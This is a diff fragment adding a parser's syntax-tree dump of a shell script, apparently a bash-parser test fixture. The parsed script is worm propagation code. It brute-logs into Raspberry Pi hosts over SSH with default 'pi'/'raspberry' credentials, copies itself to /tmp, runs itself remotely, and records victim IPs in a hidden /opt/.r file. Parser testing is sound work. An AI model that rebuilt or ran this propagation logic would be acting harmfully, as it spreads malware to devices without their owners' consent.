+                          WordNode(discard=True, lineno=79, pos=(3952, 3969), word='pi@$IP:/tmp/$NAME', parts=[
+                            ParameterNode(lineno=79, pos=(3955, 3958), value='IP'),
+                            ParameterNode(lineno=79, pos=(3964, 3969), value='NAME'),
+                          ]),
+                        ]),
+                        OperatorNode(lineno=79, op='&&', pos=(3971, 3973)),
+                        CommandNode(lineno=79, pos=(3974, 3993), parts=[
+                          WordNode(discard=True, lineno=79, pos=(3974, 3978), word='echo'),
+                          WordNode(discard=True, lineno=79, pos=(3979, 3982), word='$IP', parts=[
+                            ParameterNode(lineno=79, pos=(3979, 3982), value='IP'),
+                          ]),
+                          RedirectNode(lineno=79, output=
+                            WordNode(discard=True, lineno=79, pos=(3986, 3993), word='/opt/.r'), pos=(3983, 3993), type='>>'),
+                        ]),
+                        OperatorNode(lineno=79, op='&&', pos=(3994, 3996)),
+                        CommandNode(lineno=79, pos=(3997, 4220), parts=[
+                          WordNode(discard=True, lineno=79, pos=(3997, 4004), word='sshpass'),
+                          WordNode(discard=True, lineno=79, pos=(4005, 4016), word='-praspberry'),
+                          WordNode(discard=True, lineno=79, pos=(4017, 4020), word='ssh'),
+                          WordNode(discard=True, lineno=79, pos=(4021, 4027), word='pi@$IP', parts=[
+                            ParameterNode(lineno=79, pos=(4024, 4027), value='IP'),
+                          ]),
+                          WordNode(discard=True, lineno=79, pos=(4028, 4030), word='-o'),
+                          WordNode(discard=True, lineno=79, pos=(4031, 4047), word='ConnectTimeout=6'),
+                          WordNode(discard=True, lineno=79, pos=(4048, 4050), word='-o'),
+                          WordNode(discard=True, lineno=79, pos=(4051, 4076), word='NumberOfPasswordPrompts=1'),
+                          WordNode(discard=True, lineno=79, pos=(4077, 4079), word='-o'),
+                          WordNode(discard=True, lineno=79, pos=(4080, 4113), word='PreferredAuthentications=password'),
+                          WordNode(discard=True, lineno=79, pos=(4114, 4116), word='-o'),
+                          WordNode(discard=True, lineno=79, pos=(4117, 4145), word='UserKnownHostsFile=/dev/null'),
+                          WordNode(discard=True, lineno=79, pos=(4146, 4148), word='-o'),
+                          WordNode(discard=True, lineno=79, pos=(4149, 4173), word='StrictHostKeyChecking=no'),
+                          WordNode(discard=True, lineno=79, pos=(4174, 4220), word='cd /tmp && chmod +x $NAME && bash -c ./$NAME', parts=[
+                            ParameterNode(lineno=79, pos=(4195, 4200), value='NAME'),
+                            ParameterNode(lineno=79, pos=(4214, 4219), value='NAME'),
+                          ]),
+                        ]),
+                        OperatorNode(lineno=79, op='&', pos=(4221, 4222)),
+                        CommandNode(lineno=80, pos=(4225, 4435), parts=[
+                          WordNode(discard=True, lineno=80, pos=(4225, 4232), word='sshpass'),
+                          WordNode(discard=True, lineno=80, pos=(4233, 4259), word='-praspberryraspberry993311'),
+                          WordNode(discard=True, lineno=80, pos=(4260, 4263), word='scp'),
+                          WordNode(discard=True, lineno=80, pos=(4264, 4266), word='-o'),
+                          WordNode(discard=True, lineno=80, pos=(4267, 4283), word='ConnectTimeout=6'),
+                          WordNode(discard=True, lineno=80, pos=(4284, 4286), word='-o'),
+                          WordNode(discard=True, lineno=80, pos=(4287, 4312), word='NumberOfPasswordPrompts=1'),
+                          WordNode(discard=True, lineno=80, pos=(4313, 4315), word='-o'),
+                          WordNode(discard=True, lineno=80, pos=(4316, 4349), word='PreferredAuthentications=password'),
+                          WordNode(discard=True, lineno=80, pos=(4350, 4352), word='-o'),
+                          WordNode(discard=True, lineno=80, pos=(4353, 4381), word='UserKnownHostsFile=/dev/null'),
+                          WordNode(discard=True, lineno=80, pos=(4382, 4384), word='-o'),
+                          WordNode(discard=True, lineno=80, pos=(4385, 4409), word='StrictHostKeyChecking=no'),
+                          WordNode(discard=True, lineno=80, pos=(4410, 4417), word='$MYSELF', parts=[
+                            ParameterNode(lineno=80, pos=(4410, 4417), value='MYSELF'),
+                          ]),
+                          WordNode(discard=True, lineno=80, pos=(4418, 4435), word='pi@$IP:/tmp/$NAME', parts=[
+                            ParameterNode(lineno=80, pos=(4421, 4424), value='IP'),
+                            ParameterNode(lineno=80, pos=(4430, 4435), value='NAME'),
+                          ]),
+                        ]),
+                        OperatorNode(lineno=80, op='&&', pos=(4437, 4439)),
+                        CommandNode(lineno=80, pos=(4440, 4459), parts=[
+                          WordNode(discard=True, lineno=80, pos=(4440, 4444), word='echo'),
+                          WordNode(discard=True, lineno=80, pos=(4445, 4448), word='$IP', parts=[
+                            ParameterNode(lineno=80, pos=(4445, 4448), value='IP'),
+                          ]),
+                          RedirectNode(lineno=80, output=
+                            WordNode(discard=True, lineno=80, pos=(4452, 4459), word='/opt/.r'), pos=(4449, 4459), type='>>'),
+                        ]),
+                        OperatorNode(lineno=80, op='&&', pos=(4460, 4462)),
+                        CommandNode(lineno=80, pos=(4463, 4701), parts=[
+                          WordNode(discard=True, lineno=80, pos=(4463, 4470), word='sshpass'),
+                          WordNode(discard=True, lineno=80, pos=(4471, 4497), word='-praspberryraspberry993311'),
+                          WordNode(discard=True, lineno=80, pos=(4498, 4501), word='ssh'),
+                          WordNode(discard=True, lineno=80, pos=(4502, 4508), word='pi@$IP', parts=[
+                            ParameterNode(lineno=80, pos=(4505, 4508), value='IP'),
+                          ]),
+                          WordNode(discard=True, lineno=80, pos=(4509, 4511), word='-o'),
+                          WordNode(discard=True, lineno=80, pos=(4512, 4528), word='ConnectTimeout=6'),
+                          WordNode(discard=True, lineno=80, pos=(4529, 4531), word='-o'),
+                          WordNode(discard=True, lineno=80, pos=(4532, 4557), word='NumberOfPasswordPrompts=1'),
+                          WordNode(discard=True, lineno=80, pos=(4558, 4560), word='-o'),
+                          WordNode(discard=True, lineno=80, pos=(4561, 4594), word='PreferredAuthentications=password'),
+                          WordNode(discard=True, lineno=80, pos=(4595, 4597), word='-o'),
+                          WordNode(discard=True, lineno=80, pos=(4598, 4626), word='UserKnownHostsFile=/dev/null'),
+                          WordNode(discard=True, lineno=80, pos=(4627, 4629), word='-o'),
+                          WordNode(discard=True, lineno=80, pos=(4630, 4654), word='StrictHostKeyChecking=no'),
+                          WordNode(discard=True, lineno=80, pos=(4655, 4701), word='cd /tmp && chmod +x $NAME && bash -c ./$NAME', parts=[
+                            ParameterNode(lineno=80, pos=(4676, 4681), value='NAME'),
+                            ParameterNode(lineno=80, pos=(4695, 4700), value='NAME'),
+                          ]),
+                        ]),
+                        OperatorNode(lineno=80, op='&', pos=(4702, 4703)),
+                      ]),
+                    ReservedwordNode(lineno=81, pos=(4705, 4709), word='done'),
+                  ]),
+                ], pos=(3746, 4709)),
+                OperatorNode(lineno=82, op='\n', pos=(4709, 4710)),
+                CommandNode(lineno=82, pos=(4711, 4723), parts=[
+                  WordNode(discard=True, lineno=82, pos=(4711, 4713), word='rm'),
+                  WordNode(discard=True, lineno=82, pos=(4714, 4717), word='-rf'),
+                  WordNode(discard=True, lineno=82, pos=(4718, 4723), word='$FILE', parts=[
+                    ParameterNode(lineno=82, pos=(4718, 4723), value='FILE'),
+                  ]),
+                ]),
+                OperatorNode(lineno=83, op='\n', pos=(4723, 4724)),
+                CommandNode(lineno=83, pos=(4725, 4733), parts=[
+                  WordNode(discard=True, lineno=83, pos=(4725, 4730), word='sleep'),
+                  WordNode(discard=True, lineno=83, pos=(4731, 4733), word='10'),
+                ]),
+                OperatorNode(lineno=84, op='\n', pos=(4733, 4734)),
+              ]),
+            ReservedwordNode(lineno=84, pos=(4734, 4738), word='done'),
+          ]),
+        ], pos=(3663, 4738)),
+        OperatorNode(lineno=85, op='\n', pos=(4738, 4739)),
+      ]),
+    ReservedwordNode(lineno=86, pos=(4740, 4742), word='fi'),
+  ]),
+], pos=(74, 4742))
+CommandNode(lineno=89, pos=(4745, 4746), parts=[
+  WordNode(lineno=89, pos=(4745, 4746), word='\x00'),
+])
